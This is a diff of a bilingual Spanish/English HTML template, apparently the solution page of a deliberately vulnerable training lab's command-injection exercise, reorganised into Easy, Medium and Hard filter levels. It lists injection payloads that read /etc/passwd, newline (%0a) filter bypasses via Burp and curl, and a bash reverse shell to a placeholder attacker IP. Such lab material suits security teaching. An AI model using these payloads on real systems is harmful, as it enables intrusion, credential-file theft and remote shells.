@@ -27,41 +27,61 @@
     <h3>Pasos de explotación</h3>
     <ol>
       <li>El campo host se pasa directamente a <code>subprocess.run(shell=True)</code> sin sanitización.</li>
-      <li>Usa separadores de comandos para inyectar comandos adicionales:</li>
-    </ol>
-    <pre>127.0.0.1; whoami
+      <li><strong>Easy:</strong> Usa cualquier separador de comandos:
+        <pre>127.0.0.1; whoami
 127.0.0.1 && id
 127.0.0.1 | cat /etc/passwd
-127.0.0.1; ls -la /
-127.0.0.1; cat /etc/hostname</pre>
-    <ol start="3">
-      <li>Con Burp Suite: intercepta el POST a <code>/cmdi/ping</code> y modifica el campo <code>host</code>.</li>
-      <li>Prueba a obtener una reverse shell: <code>127.0.0.1; bash -i &gt;&amp; /dev/tcp/TU_IP/4444 0&gt;&amp;1</code></li>
+127.0.0.1; ls -la /</pre></li>
+      <li><strong>Medium:</strong> Filtra <code>;</code> y <code>|</code> pero permite <code>&&</code> y newlines:
+        <pre># && sigue funcionando
+127.0.0.1 && whoami
+127.0.0.1 && cat /etc/passwd
+
+# Newline via Burp Suite (URL-encode: %0a)
+# En Burp Repeater, modifica el body POST:
+host=127.0.0.1%0awhoami</pre></li>
+      <li><strong>Hard:</strong> Filtra <code>; | &amp; ` $ ( ) { } &lt; &gt;</code> — solo el newline (<code>%0a</code>) funciona:
+        <pre># Intercepta con Burp Suite y modifica el body:
+host=127.0.0.1%0awhoami
+host=127.0.0.1%0acat%20/etc/passwd
+host=127.0.0.1%0aid</pre></li>
+      <li>Con curl (el <code>%0a</code> se interpreta como newline en el body):
+        <pre>curl -X POST http://TARGET_IP/cmdi/ping \
+  -d "host=127.0.0.1%0awhoami"</pre></li>
+      <li>Reverse shell (solo en Easy): <code>127.0.0.1; bash -i &gt;&amp; /dev/tcp/TU_IP/4444 0&gt;&amp;1</code></li>
     </ol>
     <h3>Herramientas</h3>
     <div><span class="tools-badge">Burp Suite</span> <span class="tools-badge">curl</span> <span class="tools-badge">netcat</span></div>
-    <pre>curl -X POST http://localhost:5000/cmdi/ping \
-  -d "host=127.0.0.1;whoami"</pre>
   </div>
   <div class="lang-content" data-lang="en" style="display:none">
     <h3>Exploitation Steps</h3>
     <ol>
       <li>The host field is passed directly to <code>subprocess.run(shell=True)</code> without sanitization.</li>
-      <li>Use command separators to inject additional commands:</li>
-    </ol>
-    <pre>127.0.0.1; whoami
+      <li><strong>Easy:</strong> Use any command separator:
+        <pre>127.0.0.1; whoami
 127.0.0.1 && id
 127.0.0.1 | cat /etc/passwd
-127.0.0.1; ls -la /
-127.0.0.1; cat /etc/hostname</pre>
-    <ol start="3">
-      <li>With Burp Suite: intercept the POST to <code>/cmdi/ping</code> and modify the <code>host</code> field.</li>
-      <li>Try a reverse shell: <code>127.0.0.1; bash -i &gt;&amp; /dev/tcp/YOUR_IP/4444 0&gt;&amp;1</code></li>
+127.0.0.1; ls -la /</pre></li>
+      <li><strong>Medium:</strong> Filters <code>;</code> and <code>|</code> but allows <code>&&</code> and newlines:
+        <pre># && still works
+127.0.0.1 && whoami
+127.0.0.1 && cat /etc/passwd
+
+# Newline via Burp Suite (URL-encode: %0a)
+# In Burp Repeater, modify the POST body:
+host=127.0.0.1%0awhoami</pre></li>
+      <li><strong>Hard:</strong> Filters <code>; | &amp; ` $ ( ) { } &lt; &gt;</code> — only newline (<code>%0a</code>) works:
+        <pre># Intercept with Burp Suite and modify the body:
+host=127.0.0.1%0awhoami
+host=127.0.0.1%0acat%20/etc/passwd
+host=127.0.0.1%0aid</pre></li>
+      <li>With curl (<code>%0a</code> is interpreted as newline in the body):
+        <pre>curl -X POST http://TARGET_IP/cmdi/ping \
+  -d "host=127.0.0.1%0awhoami"</pre></li>
+      <li>Reverse shell (Easy only): <code>127.0.0.1; bash -i &gt;&amp; /dev/tcp/YOUR_IP/4444 0&gt;&amp;1</code></li>
     </ol>
     <h3>Tools</h3>
     <div><span class="tools-badge">Burp Suite</span> <span class="tools-badge">curl</span> <span class="tools-badge">netcat</span></div>
-    <pre>curl -X POST http://localhost:5000/cmdi/ping \
-  -d "host=127.0.0.1;whoami"</pre>
   </div>
 </div>
 {% endblock %}
